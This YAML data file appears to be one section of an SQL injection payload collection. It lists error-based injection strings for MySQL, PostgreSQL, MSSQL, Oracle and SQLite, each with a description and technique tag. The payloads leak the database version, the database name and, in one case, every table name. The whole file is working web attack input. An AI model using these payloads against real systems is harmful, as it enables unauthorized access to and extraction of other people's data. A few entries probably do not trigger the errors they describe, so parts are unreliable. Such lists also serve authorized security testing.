###############################################################################
# 5. ERROR-BASED INJECTION
###############################################################################
error_based:
  mysql:
    - payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) -- -"
      description: "MySQL XPATH error — version leak"
      technique: "xpath_error"
      tag: "classic"
    - payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -"
      description: "MySQL XPATH error — database name"
      technique: "xpath_error"
    - payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -"
      description: "MySQL XPATH error — all tables"
      technique: "xpath_error"
      tag: "data_extraction"
    - payload: "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1) -- -"
      description: "MySQL UPDATEXML error — version"
      technique: "updatexml_error"
    - payload: "' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,@@version,FLOOR(RAND()*2))) -- -"
      description: "MySQL double-query error — version"
      technique: "duplicate_entry_error"
    - payload: "' AND 1=2 UNION SELECT 1,2,3,4,5 -- -"
      description: "Union error with type mismatch"
      technique: "type_mismatch_error"

  postgresql:
    - payload: "' AND 1=CAST((SELECT version()) AS INT) -- -"
      description: "PostgreSQL CAST error — version leak"
      technique: "cast_error"
      tag: "classic"
    - payload: "' AND 1=CAST((SELECT current_database()) AS INT) -- -"
      description: "PostgreSQL CAST error — database name"
      technique: "cast_error"
    - payload: "' AND 1=(SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000)) -- -"
      description: "PostgreSQL heavy query error"
      technique: "heavy_query"
    - payload: "' AND 1=(SELECT 1/0) -- -"
      description: "PostgreSQL divide by zero error"
      technique: "divide_by_zero"

  mssql:
    - payload: "' AND 1=CONVERT(INT, @@version) -- -"
      description: "MSSQL CONVERT error — version leak"
      technique: "convert_error"
      tag: "classic"
    - payload: "' AND 1=CONVERT(INT, (SELECT DB_NAME())) -- -"
      description: "MSSQL CONVERT error — database name"
      technique: "convert_error"
    - payload: "' AND 1=CAST(@@version AS INT) -- -"
      description: "MSSQL CAST error — version"
      technique: "cast_error"

  oracle:
    - payload: "' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version)) -- -"
      description: "Oracle CTXSYS error — version"
      technique: "ctxsys_error"
      tag: "classic"
    - payload: "' AND 1=XMLTYPE('<xml>') -- -"
      description: "Oracle XML parse error"
      technique: "xml_error"
    - payload: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version)) -- -"
      description: "Oracle DNS resolution error"
      technique: "dns_error"

  sqlite:
    - payload: "' AND json('{}') -- -"
      description: "SQLite JSON parse error"
      technique: "json_error"
    - payload: "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END -- -"
      description: "SQLite conditional JSON error"
      technique: "conditional_json_error"

